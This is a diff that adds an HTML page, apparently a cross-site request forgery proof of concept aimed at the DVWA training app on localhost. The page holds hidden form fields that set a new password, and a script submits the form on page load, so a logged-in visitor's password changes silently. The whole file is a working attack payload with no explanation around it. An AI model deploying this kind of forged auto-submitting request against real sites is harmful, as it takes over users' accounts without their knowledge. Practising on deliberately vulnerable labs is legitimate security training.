@@ -1,0 +1,29 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Document</title>
+</head>
+<body>
+    <form action="http://localhost/DVWA/vulnerabilities/csrf/" method="GET">
+  
+        <input type="hidden" autocomplete="off" name="password_new" value="abcd123"><br>
+      
+        <input type="hidden" autocomplete="off" name="password_conf" value="abcd123"><br>
+        <br>
+        <input type="hidden" value="Change" name="Change">
+
+    </form>
+
+
+    <script>
+        window.onload = function(){
+  document.forms[0].submit();
+
+
+    }
+
+    </script>
+</body>
+</html>
